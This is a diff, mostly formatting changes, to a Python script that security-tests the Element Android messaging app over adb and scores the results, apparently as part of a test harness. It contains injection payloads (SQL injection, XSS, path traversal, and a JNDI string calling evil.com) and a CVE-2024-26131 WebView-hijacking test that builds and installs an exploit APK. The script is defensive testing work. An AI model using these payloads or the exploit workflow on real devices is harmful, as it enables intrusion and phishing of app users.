@@ -5,11 +5,10 @@ Tests for data tampering, code injection, and integrity verification
 """
 
 import json
+import os
 import subprocess
 import sys
-import hashlib
-import os
-from typing import Any, Dict, Tuple, List
+from typing import Any, Dict, Tuple
 
 
 def run_adb_command(command: str) -> Tuple[bool, str]:
@@ -30,18 +29,20 @@ def test_app_signature_verification() -> Dict[str, Any]:
     Test if Element app signature is valid and hasn't been tampered with
     """
     test_name = "app_signature_verification"
-    
+
     # Get app signature info
-    success, output = run_adb_command("shell dumpsys package im.vector.app.debug | grep -A5 -B5 signatures")
-    
+    success, output = run_adb_command(
+        "shell dumpsys package im.vector.app.debug | grep -A5 -B5 signatures"
+    )
+
     if not success or not output:
         return {
             "test": test_name,
             "success": False,
             "score": 0,
-            "message": "Could not retrieve app signature information"
+            "message": "Could not retrieve app signature information",
         }
-    
+
     # Check if app is signed (basic check)
     if "signatures" in output.lower():
         # For debug builds, debug certificates are expected and valid
@@ -50,30 +51,30 @@ def test_app_signature_verification() -> Dict[str, Any]:
                 "test": test_name,
                 "success": True,
                 "score": 1,
-                "message": "App properly signed with debug certificate (expected for debug build)"
+                "message": "App properly signed with debug certificate (expected for debug build)",
             }
-        
+
         # Check for truly unsigned apps
         if "unsigned" in output.lower():
             return {
                 "test": test_name,
                 "success": True,
                 "score": 0,
-                "message": "App is unsigned - security risk"
+                "message": "App is unsigned - security risk",
             }
-        
+
         return {
             "test": test_name,
             "success": True,
             "score": 1,
-            "message": "App signature appears valid"
+            "message": "App signature appears valid",
         }
-    
+
     return {
         "test": test_name,
         "success": True,
         "score": 0,
-        "message": "No valid signature found"
+        "message": "No valid signature found",
     }
 
 
@@ -82,48 +83,49 @@ def test_code_injection_vulnerability() -> Dict[str, Any]:
     Test for potential code injection vulnerabilities
     """
     test_name = "code_injection_vulnerability"
-    
+
     # Test SQLi-like injection in app components
     injection_payloads = [
         "'; DROP TABLE messages; --",
         "' OR '1'='1",
         "<script>alert('xss')</script>",
         "../../../etc/passwd",
-        "${jndi:ldap://evil.com/exploit}"
+        "${jndi:ldap://evil.com/exploit}",
     ]
-    
+
     vulnerabilities_found = 0
-    
+
     for payload in injection_payloads:
         # Test injection via intent data
         success, output = run_adb_command(
             f"shell am start -n im.vector.app/.features.MainActivity --es 'test_data' '{payload}'"
         )
-        
+
         # Check if app crashes or shows unusual behavior
         if success:
             import time
+
             time.sleep(2)
-            
+
             # Check if app is still running
             success, ps_output = run_adb_command("shell pidof im.vector.app.debug")
             if not success or not ps_output:
                 vulnerabilities_found += 1
                 break
-    
+
     if vulnerabilities_found > 0:
         return {
             "test": test_name,
             "success": True,
             "score": 0,
-            "message": f"Potential injection vulnerabilities found with {vulnerabilities_found} payloads"
+            "message": f"Potential injection vulnerabilities found with {vulnerabilities_found} payloads",
         }
-    
+
     return {
         "test": test_name,
         "success": True,
         "score": 1,
-        "message": "No obvious injection vulnerabilities detected"
+        "message": "No obvious injection vulnerabilities detected",
     }
 
 
@@ -132,45 +134,45 @@ def test_file_integrity() -> Dict[str, Any]:
     Test integrity of critical app files
     """
     test_name = "file_integrity"
-    
+
     # Check if app files have been modified
     success, output = run_adb_command("shell stat /data/app/im.vector.app*/base.apk")
-    
+
     if not success:
         return {
             "test": test_name,
             "success": False,
             "score": 1,
-            "message": "Could not access app files (properly protected)"
+            "message": "Could not access app files (properly protected)",
         }
-    
+
     # Look for unusual file permissions or modification times
     critical_issues = []
-    
+
     if "777" in output or "666" in output:
         critical_issues.append("Overly permissive file permissions")
-    
+
     # Check for writable app directories
     success, write_test = run_adb_command(
         "shell test -w /data/app/im.vector.app* && echo 'WRITABLE' || echo 'READ_ONLY'"
     )
-    
+
     if success and "WRITABLE" in write_test:
         critical_issues.append("App directory is writable")
-    
+
     if critical_issues:
         return {
             "test": test_name,
             "success": True,
             "score": 0,
-            "message": f"File integrity issues found: {critical_issues}"
+            "message": f"File integrity issues found: {critical_issues}",
         }
-    
+
     return {
         "test": test_name,
         "success": True,
         "score": 1,
-        "message": "App file integrity appears intact"
+        "message": "App file integrity appears intact",
     }
 
 
@@ -179,47 +181,51 @@ def test_runtime_tampering() -> Dict[str, Any]:
     Test for runtime application tampering
     """
     test_name = "runtime_tampering"
-    
+
     # Check for debugging flags or developer options
-    success, output = run_adb_command("shell dumpsys package im.vector.app | grep -i debug")
-    
+    success, output = run_adb_command(
+        "shell dumpsys package im.vector.app | grep -i debug"
+    )
+
     debug_indicators = []
-    
+
     if success and output:
         if "debuggable=true" in output.lower():
             debug_indicators.append("App is debuggable")
-        
+
         if "testOnly=true" in output.lower():
             debug_indicators.append("App has testOnly flag")
-    
+
     # Check for hooking frameworks
     success, maps_output = run_adb_command("shell pidof im.vector.app")
-    
+
     if success and maps_output:
         pid = maps_output.strip()
-        success, mem_maps = run_adb_command(f"shell cat /proc/{pid}/maps 2>/dev/null | grep -i xposed")
-        
+        success, mem_maps = run_adb_command(
+            f"shell cat /proc/{pid}/maps 2>/dev/null | grep -i xposed"
+        )
+
         if success and mem_maps:
             debug_indicators.append("Xposed framework detected")
-    
+
     # Check for frida or other dynamic analysis tools
     success, frida_check = run_adb_command("shell ps | grep frida")
     if success and frida_check:
         debug_indicators.append("Frida server detected")
-    
+
     if debug_indicators:
         return {
             "test": test_name,
             "success": True,
             "score": 0.3,
-            "message": f"Runtime tampering indicators found: {debug_indicators}"
+            "message": f"Runtime tampering indicators found: {debug_indicators}",
         }
-    
+
     return {
         "test": test_name,
         "success": True,
         "score": 1,
-        "message": "No runtime tampering detected"
+        "message": "No runtime tampering detected",
     }
 
 
@@ -235,18 +241,21 @@ def test_data_corruption_handling() -> Dict[str, Any]:
     )
 
     # Start the app and see if it handles corruption gracefully
-    success, start_output = run_adb_command("shell am start -n im.vector.app.debug/im.vector.application.features.Alias")
+    success, start_output = run_adb_command(
+        "shell am start -n im.vector.app.debug/im.vector.application.features.Alias"
+    )
 
     if not success:
         return {
             "test": test_name,
             "success": True,
             "score": 1,
-            "message": "App properly handles data corruption (failed to start with corrupted data)"
+            "message": "App properly handles data corruption (failed to start with corrupted data)",
         }
 
     # Check if app is still running after a few seconds
     import time
+
     time.sleep(5)
 
     success, ps_output = run_adb_command("shell pidof im.vector.app.debug")
@@ -261,14 +270,14 @@ def test_data_corruption_handling() -> Dict[str, Any]:
             "test": test_name,
             "success": True,
             "score": 1,
-            "message": "App handles data corruption gracefully"
+            "message": "App handles data corruption gracefully",
         }
 
     return {
         "test": test_name,
         "success": True,
         "score": 0.5,
-        "message": "App behavior unclear after data corruption test"
+        "message": "App behavior unclear after data corruption test",
     }
 
 
@@ -296,21 +305,15 @@ def test_webview_hijacking_cve_2024_26131() -> Dict[str, Any]:
             "test": test_name,
             "success": False,
             "score": 1,
-            "message": "Element not installed - cannot test WebView hijacking"
+            "message": "Element not installed - cannot test WebView hijacking",
         }
 
     # Use the malicious app from vuln_scenario_0 (same as PIN bypass)
-    import os
     vuln_scenario_dir = os.path.join(
-        os.path.dirname(__file__),
-        "vuln_scenarios",
-        "vuln_scenario_0"
+        os.path.dirname(__file__), "vuln_scenarios", "vuln_scenario_0"
     )
     malicious_apk_path = os.path.join(
-        vuln_scenario_dir,
-        "malicious_app",
-        "dist",
-        "element-exploit.apk"
+        vuln_scenario_dir, "malicious_app", "dist", "element-exploit.apk"
     )
     build_script = os.path.join(vuln_scenario_dir, "malicious_app", "build.sh")
 
@@ -319,7 +322,7 @@ def test_webview_hijacking_cve_2024_26131() -> Dict[str, Any]:
             "test": test_name,
             "success": False,
             "score": 1,
-            "message": "Malicious app build script not found"
+            "message": "Malicious app build script not found",
         }
 
     # Build the exploit APK
@@ -329,21 +332,21 @@ def test_webview_hijacking_cve_2024_26131() -> Dict[str, Any]:
             shell=True,
             capture_output=True,
             text=True,
-            timeout=120
+            timeout=120,
         )
         if result.returncode != 0 or not os.path.exists(malicious_apk_path):
             return {
                 "test": test_name,
                 "success": False,
                 "score": 1,
-                "message": "Failed to build malicious APK"
+                "message": "Failed to build malicious APK",
             }
     except Exception as e:
         return {
             "test": test_name,
             "success": False,
             "score": 1,
-            "message": f"Build error: {str(e)}"
+            "message": f"Build error: {str(e)}",
         }
 
     # Uninstall any existing malicious app
@@ -356,7 +359,7 @@ def test_webview_hijacking_cve_2024_26131() -> Dict[str, Any]:
             "test": test_name,
             "success": False,
             "score": 1,
-            "message": "Failed to install malicious APK"
+            "message": "Failed to install malicious APK",
         }
 
     # Clear logcat to capture exploit activity
@@ -374,7 +377,7 @@ def test_webview_hijacking_cve_2024_26131() -> Dict[str, Any]:
             "test": test_name,
             "success": False,
             "score": 1,
-            "message": "Failed to launch exploit app"
+            "message": "Failed to launch exploit app",
         }
 
     # Wait for exploit to execute
@@ -393,9 +396,7 @@ def test_webview_hijacking_cve_2024_26131() -> Dict[str, Any]:
     exploit_logged = "WEBVIEW HIJACKING" in logcat_output if logcat_output else False
 
     # Check for phishing URL evidence
-    success, url_check = run_adb_command(
-        "logcat -d | grep -i 'shielder.com\\|PHISHED'"
-    )
+    success, url_check = run_adb_command("logcat -d | grep -i 'shielder.com\\|PHISHED'")
 
     # Clean up malicious app
     run_adb_command(f"uninstall {attacker_pkg}")
@@ -409,28 +410,28 @@ def test_webview_hijacking_cve_2024_26131() -> Dict[str, Any]:
             "test": test_name,
             "success": True,
             "score": 0,
-            "message": "CVE-2024-26131 WebView hijacking VULNERABLE - VectorWebViewActivity launched with external URL (UI spoofing/phishing attack possible)"
+            "message": "CVE-2024-26131 WebView hijacking VULNERABLE - VectorWebViewActivity launched with external URL (UI spoofing/phishing attack possible)",
         }
     elif webview_active:
         return {
             "test": test_name,
             "success": True,
             "score": 0,
-            "message": "CVE-2024-26131 WebView hijacking VULNERABLE - VectorWebViewActivity accessible via intent redirection"
+            "message": "CVE-2024-26131 WebView hijacking VULNERABLE - VectorWebViewActivity accessible via intent redirection",
         }
     elif exploit_logged:
         return {
             "test": test_name,
             "success": True,
             "score": 0.5,
-            "message": "WebView exploit executed but activity launch unclear"
+            "message": "WebView exploit executed but activity launch unclear",
         }
 
     return {
         "test": test_name,
         "success": True,
         "score": 1,
-        "message": "WebView hijacking exploit did not succeed - vulnerability appears patched"
+        "message": "WebView hijacking exploit did not succeed - vulnerability appears patched",
     }
 
 
@@ -442,7 +443,7 @@ def main():
         test_file_integrity,
         test_runtime_tampering,
         test_data_corruption_handling,
-        test_webview_hijacking_cve_2024_26131
+        test_webview_hijacking_cve_2024_26131,
     ]
 
     results = []
@@ -459,7 +460,7 @@ def main():
     output = {
         "score": final_score,
         "details": results,
-        "summary": f"Integrity tests completed. Score: {final_score}"
+        "summary": f"Integrity tests completed. Score: {final_score}",
     }
 
     print(json.dumps(output, indent=2))
